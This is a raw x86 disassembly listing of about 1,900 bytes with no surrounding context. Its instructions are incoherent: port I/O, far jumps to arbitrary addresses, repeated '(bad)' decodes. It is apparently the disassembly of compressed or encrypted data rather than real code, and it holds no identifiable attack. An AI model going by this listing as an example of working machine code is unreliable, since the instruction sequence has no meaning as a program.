  4051c1:	xor    BYTE PTR [edx-0x66941634],ah
  4051c7:	sbb    dh,BYTE PTR [esi-0x13787e01]
  4051cd:	aam    0x7b
  4051cf:	add    ch,BYTE PTR [esi-0xada4e72]
  4051d5:	mov    ebx,?
  4051d7:	mov    edx,0x34f4a830
  4051dc:	outs   dx,DWORD PTR ds:[esi]
  4051dd:	call   0xc2be4a1
  4051e2:	jb     0x4051e3
  4051e4:	inc    esp
  4051e5:	in     eax,0x99
  4051e7:	pop    esp
  4051e8:	in     al,dx
  4051e9:	sti    
  4051ea:	out    dx,eax
  4051eb:	xchg   esi,eax
  4051ec:	sub    ebp,esi
  4051ee:	cwde   
  4051ef:	std    
  4051f0:	add    DWORD PTR [eax+0x3aef0e21],0xe9e62fe
  4051fa:	and    al,0xad
  4051fc:	cmp    bl,ah
  4051fe:	in     al,0x8e
  405200:	out    0x47,al
  405202:	xor    DWORD PTR [edx-0x7ad236a2],edx
  405208:	push   ebx
  405209:	mov    dl,0x66
  40520b:	dec    edi
  40520c:	out    0xc5,al
  40520e:	xchg   edx,eax
  40520f:	imul   esp,DWORD PTR [edi+edi*2+0x626b2b6e],0x2b
  405217:	xchg   edx,eax
  405218:	test   BYTE PTR [edi],ch
  40521a:	imul   DWORD PTR [ecx+ecx*8+0x35]
  40521e:	jne    0x4051bf
  405220:	mov    esi,0xaa8cb041
  405225:	aaa    
  405226:	push   cs
  405227:	pop    eax
  405228:	js     0x4051d4
  40522a:	sub    BYTE PTR [ecx+0x3c1f8b32],0x7a
  405231:	lods   al,BYTE PTR ds:[esi]
  405232:	aad    0x97
  405234:	push   es
  405235:	pop    eax
  405236:	mov    bl,0xa4
  405238:	mov    cl,0xf
  40523a:	inc    ecx
  40523b:	dec    eax
  40523c:	mov    ebp,eax
  40523e:	ds pop esi
  405240:	pop    ebx
  405241:	cmp    al,0xfa
  405243:	repz popf 
  405245:	js     0x405232
  405247:	sbb    bl,cl
  405249:	dec    edi
  40524a:	jle    0x4052a1
  40524c:	push   ss
  40524d:	xor    BYTE PTR [eax],0x74
  405250:	jecxz  0x40521f
  405252:	jbe    0x405285
  405254:	dec    eax
  405255:	mov    edx,0xf3ad0c4c
  40525a:	in     al,0x83
  40525c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40525d:	and    DWORD PTR [ebp+0x1b796338],eax
  405263:	fldcw  WORD PTR [ebp+0x6b]
  405266:	out    0x3b,al
  405268:	xlat   BYTE PTR ds:[ebx]
  405269:	shl    DWORD PTR [edx-0x700a55f7],cl
  40526f:	xor    BYTE PTR [ebp+0xa],ch
  405272:	lods   al,BYTE PTR ds:[esi]
  405273:	jp     0x4052b1
  405275:	sbb    DWORD PTR [ecx],esi
  405277:	add    BYTE PTR [edx],bl
  405279:	test   BYTE PTR [eax-0x7cae2fd5],ch
  40527f:	xchg   BYTE PTR [esi],al
  405281:	pusha  
  405282:	pop    ebx
  405283:	and    eax,0xf2d500c6
  405288:	push   ebp
  405289:	or     al,0xd4
  40528b:	cli    
  40528c:	int3   
  40528d:	clc    
  40528e:	jmp    0xa61d1d02
  405293:	in     al,dx
  405294:	fld    QWORD PTR [ecx+0x7c148ef4]
  40529a:	push   cs
  40529b:	mov    ecx,DWORD PTR ds:0xfb5884b0
  4052a1:	fadd   DWORD PTR [edi]
  4052a3:	call   0xf0ac:0x7adb9bb3
  4052aa:	into   
  4052ab:	out    0x7f,eax
  4052ad:	inc    esp
  4052ae:	and    esp,esp
  4052b0:	loopne 0x405265
  4052b2:	sbb    DWORD PTR [ebx+0x41665e00],ecx
  4052b8:	mov    eax,0xbf19c2ed
  4052bd:	inc    esp
  4052be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052bf:	inc    ecx
  4052c0:	lahf   
  4052c1:	mov    bl,0x50
  4052c3:	xor    eax,0xa6b35bc2
  4052c8:	adc    eax,0x2659caed
  4052cd:	mov    ?,WORD PTR [edi+0x79]
  4052d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052d1:	mov    al,ds:0x1b9a5be5
  4052d6:	adc    dh,al
  4052d8:	push   0x7ad94e23
  4052dd:	stos   BYTE PTR es:[edi],al
  4052de:	ins    DWORD PTR es:[edi],dx
  4052df:	mov    ch,BYTE PTR [esi]
  4052e1:	cmc    
  4052e2:	jg     0x405293
  4052e4:	inc    ebp
  4052e5:	fwait
  4052e6:	mov    BYTE PTR [eax-0x58],ah
  4052e9:	in     eax,dx
  4052ea:	xor    ch,BYTE PTR [eax]
  4052ec:	nop
  4052ed:	inc    esi
  4052ee:	push   0xdb090b85
  4052f3:	mov    ah,0x40
  4052f5:	cmp    ecx,DWORD PTR [ebp+0x47abe2cd]
  4052fb:	(bad)  
  4052fc:	push   ebx
  4052fd:	add    al,0x49
  4052ff:	xchg   edi,eax
  405300:	sub    DWORD PTR [ecx],ebx
  405302:	inc    edi
  405303:	outs   dx,DWORD PTR ds:[esi]
  405304:	cli    
  405305:	sbb    eax,0x5aea63ba
  40530a:	sahf   
  40530b:	cdq    
  40530c:	or     BYTE PTR [edx-0x71],ch
  40530f:	mov    ds,ebp
  405311:	add    eax,ebp
  405313:	add    ebp,esi
  405315:	and    al,0xba
  405317:	dec    esi
  405318:	jle    0x4052c5
  40531a:	std    
  40531b:	cmp    edi,DWORD PTR [edx-0x6c]
  40531e:	ds jno 0x40536f
  405321:	cmp    DWORD PTR [ebx+0x75fbf0f9],0x2f
  405328:	jecxz  0x405316
  40532a:	dec    edi
  40532b:	ret    0x9af0
  40532e:	cs aad 0xd8
  405331:	and    bl,bl
  405333:	and    DWORD PTR [edi*4+0x685484ea],eax
  40533a:	adc    esi,DWORD PTR [ebp-0x51c37f8c]
  405340:	sub    esi,DWORD PTR [edi]
  405342:	cmp    al,BYTE PTR [ecx-0x1bc4b48a]
  405348:	iret   
  405349:	dec    esp
  40534a:	dec    ch
  40534c:	jo     0x405303
  40534e:	jg     0x405375
  405350:	push   cs
  405351:	bound  edx,QWORD PTR [ecx+edx*4]
  405354:	dec    eax
  405355:	mov    esp,0xef570e35
  40535a:	je     0x405327
  40535c:	xchg   esp,eax
  40535d:	fmul   QWORD PTR [esi]
  40535f:	icebp  
  405360:	xor    DWORD PTR [ebx],edx
  405362:	into   
  405363:	or     eax,0x7ce61620
  405368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405369:	cmp    dl,bh
  40536b:	xchg   ecx,eax
  40536c:	inc    edi
  40536d:	aas    
  40536e:	shl    DWORD PTR [esi],1
  405370:	sti    
  405371:	into   
  405372:	(bad)  
  405373:	inc    eax
  405374:	fldcw  WORD PTR [eax-0x18]
  405377:	xchg   ebx,eax
  405378:	bnd jnp 0x40539b
  40537b:	(bad)  
  40537c:	jmp    ecx
  40537e:	push   0x4d
  405380:	push   0x45
  405382:	dec    eax
  405383:	lods   al,BYTE PTR ds:[esi]
  405384:	fs mov esp,0x3dfb0165
  40538a:	cwde   
  40538b:	cld    
  40538c:	cmc    
  40538d:	sbb    bh,BYTE PTR [ebx]
  40538f:	push   0xeb073a6e
  405394:	inc    ebx
  405395:	cmp    al,0xcb
  405397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405398:	mov    cl,0x75
  40539a:	data16 sbb ah,0x22
  40539e:	outs   dx,BYTE PTR ds:[esi]
  40539f:	aam    0xc6
  4053a1:	cmp    dh,ah
  4053a3:	jae    0x405377
  4053a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053a6:	xchg   DWORD PTR [edx-0x375f38c2],edx
  4053ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ad:	inc    ebx
  4053ae:	mov    ebp,ebx
  4053b0:	fld    DWORD PTR [ecx+0x68801c8a]
  4053b6:	mov    eax,ds:0xd950873a
  4053bb:	pop    ebx
  4053bc:	hlt    
  4053bd:	xlat   BYTE PTR ds:[ebx]
  4053be:	in     al,dx
  4053bf:	mov    ebx,esi
  4053c1:	jg     0x405438
  4053c3:	adc    al,BYTE PTR [edi-0x3d]
  4053c6:	out    dx,eax
  4053c7:	out    dx,al
  4053c8:	inc    edi
  4053c9:	push   es
  4053ca:	or     BYTE PTR [eax+0x156267ca],bl
  4053d0:	and    bh,cl
  4053d2:	jmp    0x509355c1
  4053d7:	dec    ebp
  4053d8:	(bad)  
  4053d9:	add    BYTE PTR [edx-0x1eba3ec4],0xe9
  4053e0:	(bad)  
  4053e2:	repz pop ecx
  4053e4:	adc    BYTE PTR [eax],al
  4053e6:	sub    dl,ah
  4053e8:	jb     0x40539d
  4053ea:	fs cmp al,0xb5
  4053ed:	inc    eax
  4053ee:	into   
  4053ef:	ror    dh,1
  4053f1:	jmp    0xb3c7253f
  4053f6:	mov    WORD PTR [eax],fs
  4053f8:	and    DWORD PTR [ecx-0x524f84ea],ecx
  4053fe:	(bad)  
  405400:	sbb    BYTE PTR [ecx],0x70
  405403:	cmc    
  405404:	pusha  
  405405:	nop
  405406:	mov    ?,WORD PTR es:[ecx]
  405409:	cwde   
  40540a:	pop    esp
  40540b:	xchg   ebx,eax
  40540c:	push   0xffffffea
  40540e:	pop    ss
  40540f:	mov    WORD PTR [esi+0x3fb9e7bb],es
  405415:	push   es
  405416:	inc    esp
  405417:	mov    dh,0x9a
  405419:	and    DWORD PTR [ecx+0x12af0312],esi
  40541f:	pop    ebp
  405420:	cli    
  405421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405422:	cwde   
  405423:	fisubr DWORD PTR [ebp-0x19]
  405426:	call   0x773ca63f
  40542b:	cmp    al,0xf4
  40542d:	mov    eax,0xb366da77
  405432:	xchg   bx,ax
  405434:	or     esi,edx
  405436:	sar    DWORD PTR [edi-0xd],cl
  405439:	ins    DWORD PTR es:[edi],dx
  40543a:	pusha  
  40543b:	repz dec edi
  40543d:	sub    ah,BYTE PTR [esi+ecx*4+0x2f]
  405441:	mov    edx,0xb6bb672b
  405446:	xchg   ebx,eax
  405447:	inc    ebx
  405448:	(bad)  
  405449:	pop    ss
  40544a:	pop    ds
  40544b:	call   0x62049b79
  405450:	inc    esp
  405451:	fdiv   QWORD PTR [ebx+0x4534d7b9]
  405457:	mov    dl,0x10
  405459:	xchg   esi,eax
  40545a:	ins    DWORD PTR es:[edi],dx
  40545b:	mov    ebp,0xc2f4c3ae
  405460:	aad    0x57
  405462:	sub    al,0x53
  405464:	popf   
  405465:	pop    ebp
  405466:	ds xchg ecx,eax
  405468:	cmp    DWORD PTR [eax],ebx
  40546a:	gs jns 0x40543f
  40546d:	repnz push 0x1e
  405470:	xchg   di,ax
  405472:	into   
  405473:	jo     0x4054a1
  405475:	or     BYTE PTR [ebx+ebp*2],ch
  405478:	pop    ds
  405479:	add    DWORD PTR [eax+0x9],ebx
  40547c:	dec    edx
  40547d:	sub    eax,0x35967e40
  405482:	jno    0x4054ec
  405484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405485:	jae    0x405451
  405487:	cmp    BYTE PTR [edx+0xf],cl
  40548a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40548b:	in     al,dx
  40548c:	mov    bh,0x9
  40548e:	and    BYTE PTR [edx+0x5a0ba40f],cl
  405494:	inc    esp
  405495:	push   eax
  405496:	test   eax,0xa3bf30a8
  40549b:	sbb    DWORD PTR [ecx],edi
  40549d:	test   DWORD PTR [ecx+edx*2+0x21dad367],eax
  4054a4:	cmp    ah,BYTE PTR [esi+0x49]
  4054a7:	pusha  
  4054a8:	mov    WORD PTR [edi],?
  4054aa:	mov    dl,0x42
  4054ac:	cmp    ah,0xe6
  4054af:	jne    0x4054df
  4054b1:	push   ebx
  4054b2:	jae    0x405454
  4054b4:	adc    DWORD PTR [esi],ebx
  4054b6:	pop    es
  4054b7:	ret    0x8fe1
  4054ba:	and    BYTE PTR ds:0x90dabbf2,dh
  4054c0:	loope  0x4054d6
  4054c2:	pop    eax
  4054c3:	push   ebp
  4054c4:	cmc    
  4054c5:	ret    
  4054c6:	and    dh,ch
  4054c8:	std    
  4054c9:	inc    ebx
  4054ca:	lock push 0xffffffc4
  4054cd:	into   
  4054ce:	cs pop ecx
  4054d0:	cli    
  4054d1:	pop    ebp
  4054d2:	mov    bh,0xc8
  4054d4:	retf   
  4054d5:	pop    ebx
  4054d6:	push   esi
  4054d7:	jns    0x40552c
  4054d9:	cmp    al,0x25
  4054db:	jp     0x4054d1
  4054dd:	mov    ebx,esi
  4054df:	hlt    
  4054e0:	cmp    DWORD PTR [ebx-0x6fd21e57],ebp
  4054e6:	daa    
  4054e7:	and    al,0x10
  4054e9:	xor    DWORD PTR [ecx-0x7f],edx
  4054ec:	(bad)  
  4054ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054ee:	mov    DWORD PTR [eax-0x10],0x4414d52b
  4054f5:	or     edi,DWORD PTR [ebx]
  4054f7:	push   ebp
  4054f8:	inc    edx
  4054f9:	fsubr  QWORD PTR [ebx-0x59]
  4054fc:	push   esp
  4054fd:	hlt    
  4054fe:	cmp    ah,BYTE PTR ds:0x3e3d6c77
  405504:	fwait
  405505:	aas    
  405506:	leave  
  405507:	cli    
  405508:	mov    edx,0xe30e1d5c
  40550d:	ret    0x40dd
  405510:	(bad)  
  405511:	push   edi
  405512:	mov    eax,0xb46c5471
  405517:	out    0xd4,al
  405519:	cld    
  40551a:	cld    
  40551b:	mov    ds:0x1bfc5cbc,eax
  405520:	(bad)  
  405521:	sbb    DWORD PTR [ecx],ebx
  405523:	push   ss
  405524:	mov    cl,0x79
  405526:	jge    0x40551e
  405528:	dec    ebx
  405529:	xchg   esp,eax
  40552a:	sub    al,0x83
  40552c:	cmp    DWORD PTR [esi+0x4071ea07],edx
  405532:	push   ebx
  405533:	add    al,0x4
  405535:	ss stc 
  405537:	test   al,0x3d
  405539:	ins    BYTE PTR es:[edi],dx
  40553a:	add    ch,BYTE PTR [edx+0x5c]
  40553d:	das    
  40553e:	pop    eax
  40553f:	ds push edi
  405541:	into   
  405542:	jl     0x40550d
  405544:	retf   
  405545:	mov    al,0x75
  405547:	bswap  esp
  405549:	dec    ecx
  40554a:	mov    ds:0x1d55f1dd,eax
  40554f:	xor    DWORD PTR [eax],0xbb2159e8
  405555:	jae    0x40559a
  405557:	ds scas al,BYTE PTR es:[edi]
  405559:	fs in  al,dx
  40555b:	aam    0x2b
  40555d:	call   0xc35a:0x803c5ddf
  405564:	cmp    esp,DWORD PTR [edx]
  405566:	push   cs
  405567:	add    DWORD PTR [eax-0x1130e874],0xffffff95
  40556e:	pop    es
  40556f:	iret   
  405570:	or     ecx,DWORD PTR [edi+0x37]
  405573:	pop    es
  405574:	add    eax,DWORD PTR [ebp+ebx*2-0x37ac156f]
  40557b:	les    ebp,FWORD PTR [edx]
  40557d:	call   0xa0815ae6
  405582:	jmp    0x4055fd
  405584:	dec    edx
  405585:	not    BYTE PTR [ecx-0x5e498e0d]
  40558b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40558c:	xchg   ebp,eax
  40558d:	sub    ecx,DWORD PTR [esi]
  40558f:	sub    bh,bl
  405591:	push   ds
  405592:	iret   
  405593:	mov    eax,ds:0x2db82751
  405598:	xor    ah,dh
  40559a:	enter  0xe337,0xee
  40559e:	sub    al,0x32
  4055a0:	adc    dl,bl
  4055a2:	or     al,0x58
  4055a4:	test   DWORD PTR [edx-0x3],edx
  4055a7:	mov    ecx,0x37c43017
  4055ac:	cmp    ebp,DWORD PTR [edi]
  4055ae:	push   esp
  4055af:	jle    0x40554a
  4055b1:	std    
  4055b2:	mov    ds:0x313c66b,al
  4055b7:	jne    0x405588
  4055b9:	lods   eax,DWORD PTR ds:[esi]
  4055ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055bb:	pop    ds
  4055bc:	retf   
  4055bd:	inc    ebp
  4055be:	imul   ebx,DWORD PTR [ebx+0x50063a19],0xffffffbc
  4055c5:	into   
  4055c6:	push   esp
  4055c7:	ja     0x405642
  4055c9:	out    dx,eax
  4055ca:	lock inc esi
  4055cc:	add    bl,BYTE PTR [edi]
  4055ce:	enter  0xcb99,0x14
  4055d2:	mov    edi,0xd1a53a71
  4055d7:	mul    DWORD PTR [eax+0x423b1a56]
  4055dd:	jb     0x405566
  4055df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055e0:	icebp  
  4055e1:	loopne 0x40559f
  4055e3:	cs adc esi,edi
  4055e6:	(bad)  
  4055e7:	dec    edx
  4055e8:	mov    ebx,0xa6886fc1
  4055ed:	std    
  4055ee:	std    
  4055ef:	(bad)  
  4055f0:	clc    
  4055f1:	bound  esp,QWORD PTR [esi+0x2f27f92d]
  4055f7:	cld    
  4055f8:	mov    al,ds:0x9a4224e2
  4055fd:	xor    ah,dl
  4055ff:	stos   BYTE PTR es:[edi],al
  405600:	outs   dx,DWORD PTR ds:[esi]
  405601:	nop
  405602:	retf   0xdff8
  405605:	cmp    BYTE PTR [ebx+0x4c7666c2],bh
  40560b:	(bad)  
  40560c:	xchg   DWORD PTR [esi],esi
  40560e:	inc    esp
  40560f:	pop    edi
  405610:	adc    al,0xce
  405612:	push   cs
  405613:	sahf   
  405614:	call   FWORD PTR [ebx-0x2a]
  405617:	xor    eax,eax
  405619:	xchg   ecx,eax
  40561a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40561b:	or     al,0xe5
  40561d:	gs inc esp
  40561f:	fisttp WORD PTR [eax]
  405621:	ss sbb eax,0xfb4dc21e
  405627:	xor    eax,0xe6a2461b
  40562c:	or     DWORD PTR [eax],eax
  40562e:	stos   DWORD PTR es:[edi],eax
  40562f:	jno    0x4056a7
  405631:	sbb    esi,DWORD PTR ds:0x5a201018
  405637:	or     al,0xef
  405639:	xor    cl,BYTE PTR [edx-0x606be551]
  40563f:	ss jns 0x405603
  405642:	shl    DWORD PTR [ebp+0x696e477d],0x93
  405649:	dec    ebp
  40564a:	lods   eax,DWORD PTR ds:[esi]
  40564b:	pop    ecx
  40564c:	loopne 0x40561c
  40564e:	aas    
  40564f:	(bad)  
  405650:	sbb    al,cl
  405652:	mov    edi,ebx
  405654:	mov    al,ds:0x4456b3de
  405659:	or     al,0xa3
  40565b:	pop    es
  40565c:	adc    esi,ecx
  40565e:	cmpps  xmm6,XMMWORD PTR [ecx],0x4b
  405662:	add    al,0xe3
  405664:	cli    
  405665:	mov    ebp,0x9e960d8c
  40566a:	or     ch,bh
  40566c:	out    dx,eax
  40566d:	push   ebp
  40566e:	scas   eax,DWORD PTR es:[edi]
  40566f:	push   eax
  405670:	fbld   TBYTE PTR [esi-0x408c4988]
  405676:	call   0x4703af3d
  40567b:	jmp    0x15c1:0x72850149
  405682:	imul   ch
  405684:	xor    edx,DWORD PTR [edi-0x5f54bdab]
  40568a:	(bad)  
  40568b:	ja     0x4056e4
  40568d:	pushf  
  40568e:	(bad)  [ebx-0x70]
  405691:	scas   al,BYTE PTR es:[edi]
  405692:	int3   
  405693:	in     al,dx
  405694:	dec    eax
  405695:	test   eax,0xd671ab4e
  40569a:	ins    DWORD PTR es:[edi],dx
  40569b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40569c:	add    eax,0x78659997
  4056a1:	push   0x64
  4056a3:	adc    cl,BYTE PTR [edi+edx*4-0x7982716d]
  4056aa:	loope  0x4056c5
  4056ac:	lods   eax,DWORD PTR ds:[esi]
  4056ad:	add    BYTE PTR [edx+edx*2+0x2d16c5fc],dl
  4056b4:	xchg   edi,eax
  4056b5:	ror    DWORD PTR [ebx-0x30],cl
  4056b8:	inc    ebp
  4056b9:	in     al,0x72
  4056bb:	sub    eax,0xebcac9f1
  4056c0:	add    BYTE PTR [edi+0x78e3e9d2],dh
  4056c6:	dec    esi
  4056c7:	mov    edx,0xfcacf7a7
  4056cc:	loopne 0x4056bf
  4056ce:	adc    BYTE PTR [ebx+0x6],ch
  4056d1:	(bad)  
  4056d2:	leave  
  4056d3:	cmp    eax,0xf962b0c2
  4056d8:	dec    edi
  4056d9:	in     eax,0xb4
  4056db:	mov    esi,0xd2161c3d
  4056e0:	idiv   edi
  4056e2:	jg     0x405752
  4056e4:	(bad)  
  4056e5:	out    dx,eax
  4056e6:	push   esi
  4056e7:	fs mov dl,dh
  4056ea:	mov    eax,ds:0x57fa8230
  4056ef:	dec    edx
  4056f0:	or     eax,0xb06ad69a
  4056f5:	je     0x4056c1
  4056f7:	out    0x1,eax
  4056f9:	into   
  4056fa:	sub    ah,BYTE PTR [eax-0x59]
  4056fd:	mov    ds:0xe07bfee5,eax
  405702:	ins    DWORD PTR es:[edi],dx
  405703:	scas   eax,DWORD PTR es:[edi]
  405704:	(bad)  
  405705:	mov    bl,0xe6
  405707:	in     eax,0xed
  405709:	xchg   ebp,eax
  40570a:	sbb    cl,al
  40570c:	dec    edx
  40570d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40570e:	mov    ?,WORD PTR [edx]
  405710:	cs in  al,dx
  405712:	inc    ebp
  405713:	call   0x5910:0x15328886
  40571a:	aas    
  40571b:	cmp    DWORD PTR [esi+esi*8],ebp
  40571e:	pop    ecx
  40571f:	inc    ebp
  405720:	jb     0x40578d
  405722:	mov    edi,0x97e93105
  405727:	mov    ebx,0xdbb92e80
  40572c:	or     bl,BYTE PTR [eax]
  40572e:	(bad)  
  40572f:	jae    0x405740
  405731:	ficomp WORD PTR [esi+0x3bc499ff]
  405737:	inc    esi
  405738:	pop    ds
  405739:	daa    
  40573a:	test   ecx,esi
  40573c:	add    ebp,DWORD PTR [edi+0x79]
  40573f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405740:	cdq    
  405741:	mov    bl,0xe
  405743:	movups xmm1,XMMWORD PTR [edx-0x7c]
  405747:	jo     0x4057a9
  405749:	cs test eax,0xc54a15ec
  40574f:	jp     0x4057cd
  405751:	pop    edx
  405752:	repnz mov esp,0x19407fcd
  405758:	mov    ds,WORD PTR [edi-0x17]
  40575b:	jae    0x40578e
  40575d:	out    dx,al
  40575e:	icebp  
  40575f:	je     0x4057d6
  405761:	mov    edi,0xf94deda2
  405766:	in     al,0x38
  405768:	(bad)  
  405769:	mov    ?,WORD PTR [edx]
  40576b:	xchg   ecx,eax
  40576c:	test   DWORD PTR [esi+0x12],edx
  40576f:	push   ecx
  405770:	lds    edx,FWORD PTR [esi+eiz*2+0x4e]
  405774:	scas   al,BYTE PTR es:[edi]
  405775:	or     dl,BYTE PTR [edx-0x6022e91e]
  40577b:	loop   0x405722
  40577d:	jo     0x4057bb
  40577f:	sbb    DWORD PTR [ebp-0x23],esp
  405782:	cli    
  405783:	sbb    edi,ebx
  405785:	icebp  
  405786:	jmp    0xb246:0x68ebfd40
  40578d:	mov    bh,BYTE PTR [ecx]
  40578f:	sbb    al,0x2b
  405791:	mov    dh,0xf9
  405793:	jge    0x405790
  405795:	pop    ds
  405796:	pop    ebp
  405797:	and    eax,0x7acedb1a
  40579c:	adc    dh,BYTE PTR [ebx+0x369dd7fb]
  4057a2:	rcl    DWORD PTR [ebx],1
  4057a4:	add    esi,eax
  4057a6:	dec    esi
  4057a7:	inc    ecx
  4057a8:	and    BYTE PTR [ebx-0x1dff6304],bl
  4057ae:	mov    esi,ebp
  4057b0:	shl    BYTE PTR ds:0x456c6804,1
  4057b6:	and    ecx,0xeb9c63d0
  4057bc:	or     dl,BYTE PTR [ebp-0x35]
  4057bf:	push   es
  4057c0:	push   ebp
  4057c1:	inc    edi
  4057c2:	pop    ebx
  4057c3:	gs ins BYTE PTR es:[edi],dx
  4057c5:	stc    
  4057c6:	and    ch,dl
  4057c8:	icebp  
  4057c9:	in     eax,0xd5
  4057cb:	sbb    eax,0x66e38cf6
  4057d0:	jle    0x4057f9
  4057d2:	push   esi
  4057d3:	jo     0x405851
  4057d5:	clc    
  4057d6:	pop    eax
  4057d7:	dec    ecx
  4057d8:	add    BYTE PTR ds:0xea9e81e6,al
  4057de:	and    DWORD PTR [esi+0x75],eax
  4057e1:	add    ch,BYTE PTR [edi+0x38c5e247]
  4057e7:	hlt    
  4057e8:	pusha  
  4057e9:	cmp    ecx,esp
  4057eb:	scas   al,BYTE PTR es:[edi]
  4057ec:	sub    BYTE PTR [edx],0x32
  4057ef:	xchg   esp,eax
  4057f0:	popf   
  4057f1:	rol    BYTE PTR [ecx+0x3f],0x96
  4057f5:	bnd jg 0x405860
  4057f8:	fmul   st,st(1)
  4057fa:	loopne 0x4057a7
  4057fc:	add    eax,0xb7316194
  405801:	push   ecx
  405802:	push   eax
  405803:	popf   
  405804:	outs   dx,BYTE PTR ds:[esi]
  405805:	lods   eax,DWORD PTR ds:[esi]
  405807:	jo     0x4057b9
  405809:	pop    esi
  40580a:	xor    al,0xf8
  40580c:	adc    edx,DWORD PTR ds:0x70209b4c
  405812:	jo     0x4057b9
  405814:	push   esi
  405815:	jns    0x40587a
  405817:	push   0x67640106
  40581c:	test   DWORD PTR [ecx],ebp
  40581e:	sbb    ecx,DWORD PTR [ebp+0x3b]
  405821:	jae    0x4057ec
  405823:	jecxz  0x4057ff
  405825:	sbb    dh,0x6f
  405828:	cmp    bl,BYTE PTR [esi]
  40582a:	movups xmm6,XMMWORD PTR [edi-0x42]
  40582e:	aas    
  40582f:	xor    DWORD PTR [edi+0x3a8e4ef8],0x9
  405836:	imul   BYTE PTR [ebx+0x47]
  405839:	inc    ebp
  40583a:	ins    BYTE PTR es:[edi],dx
  40583b:	push   eax
  40583c:	or     edx,DWORD PTR [edi-0x64]
  40583f:	fdivp  st(2),st
  405841:	(bad)  
  405842:	stos   DWORD PTR es:[edi],eax
  405843:	out    0x9b,eax
  405845:	add    ch,cl
  405847:	outs   dx,BYTE PTR ds:[esi]
  405848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405849:	and    ah,BYTE PTR [edi-0x4405a269]
  40584f:	scas   al,BYTE PTR es:[edi]
  405850:	shl    dl,0xa2
  405853:	stc    
  405854:	ds cmp al,0xc5
  405857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405858:	call   DWORD PTR [edx+0x3b993540]
  40585e:	mov    WORD PTR [esi-0x38314e3d],ss
  405864:	shl    DWORD PTR ds:0xd8c30a2,cl
  40586a:	test   al,0x84
  40586c:	inc    eax
  40586d:	inc    ebx
  40586e:	ret    
  40586f:	mov    eax,ds:0xba6797cf
  405874:	pop    DWORD PTR [ecx+0x2c698b0f]
  40587a:	ins    DWORD PTR es:[edi],dx
  40587b:	mov    bl,0x15
  40587d:	jno    0x405860
  40587f:	adc    bh,0x25
  405882:	addr16 push edx
  405884:	lods   eax,DWORD PTR ds:[esi]
  405885:	(bad)  
  405886:	dec    ecx
  405887:	fimul  WORD PTR [eax-0x50b8f025]
  40588d:	lods   al,BYTE PTR ds:[esi]
  40588e:	sbb    al,0xa1
  405890:	out    0xa4,eax
  405892:	mov    ds:0x15b5a57d,al
  405897:	xchg   DWORD PTR [ecx],edx
  405899:	pop    ecx
  40589a:	pop    ecx
  40589b:	aad    0x44
  40589d:	mov    ecx,0x86b6a49
  4058a2:	mov    fs,ebx
  4058a4:	aas    
  4058a5:	stos   DWORD PTR es:[edi],eax
  4058a6:	cmp    DWORD PTR [ebx],ecx
  4058a8:	sbb    DWORD PTR [ebx*4+0x66c819d9],ebp
  4058af:	test   al,0x45
  4058b1:	cli    
  4058b2:	mov    dh,0x83
  4058b4:	ins    DWORD PTR es:[edi],dx
  4058b5:	gs js  0x40589b
  4058b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b9:	push   0x683d849e
  4058be:	jbe    0x40587e
  4058c0:	outs   dx,DWORD PTR ds:[esi]
  4058c1:	inc    ecx
  4058c2:	pop    edi
  4058c3:	stos   BYTE PTR es:[edi],al
  4058c4:	adc    al,0xe4
  4058c6:	retf   0xfcc6
  4058c9:	ss clc 
  4058cb:	mov    WORD PTR [ecx],es
  4058cd:	push   es
  4058ce:	mov    cl,0xc3
  4058d0:	jno    0x405874
  4058d2:	push   ds
  4058d3:	mov    eax,0x6910f2f
  4058d8:	add    eax,0x23e26486
  4058dd:	outs   dx,BYTE PTR ds:[esi]
  4058de:	sub    bh,dl
  4058e0:	std    
  4058e1:	cmp    cl,BYTE PTR [eax-0x687c2ac5]
  4058e7:	pop    es
  4058e8:	clc    
  4058e9:	mov    cl,0x39
  4058eb:	mov    al,ds:0xfc9a71aa
  4058f0:	inc    ebp
  4058f1:	xchg   ecx,eax
  4058f2:	rcr    ch,cl
  4058f4:	jl     0x4058b9
  4058f6:	jle    0x405939
  4058f8:	or     BYTE PTR [esi-0x3105c43d],dh
  4058fe:	test   al,0xf5
  405900:	mov    ds:0x835af9e9,al
  405905:	push   ds
  405906:	ss pop esi
  405908:	cs mov edx,0xb4e51305
  40590e:	mov    dl,0xbc
  405910:	in     al,dx
  405911:	xchg   esi,eax
  405912:	mov    eax,0xfe2dd930
  405917:	pop    eax
  405918:	pop    ds
  405919:	inc    edi
  40591a:	nop
  40591b:	enter  0xf36d,0xa1
  40591f:	sub    eax,0xd1155966
  405924:	push   es
  405925:	adc    al,0x90
  405927:	loope  0x4058ab
  405929:	lods   al,BYTE PTR ds:[esi]
  40592a:	inc    edx
  40592b:	cmp    dh,bh
  40592d:	and    DWORD PTR [ebx+ecx*1],ebx
  405930:	sub    BYTE PTR [ecx-0x3b],ah
  405933:	pop    esp
  405934:	imul   edx,DWORD PTR [edi],0x91af1c82
  40593a:	push   esp
  40593b:	push   esp
  40593c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40593d:	push   esi
  40593e:	fucomip st,st(0)
  405940:	xchg   edx,eax
  405941:	(bad)  
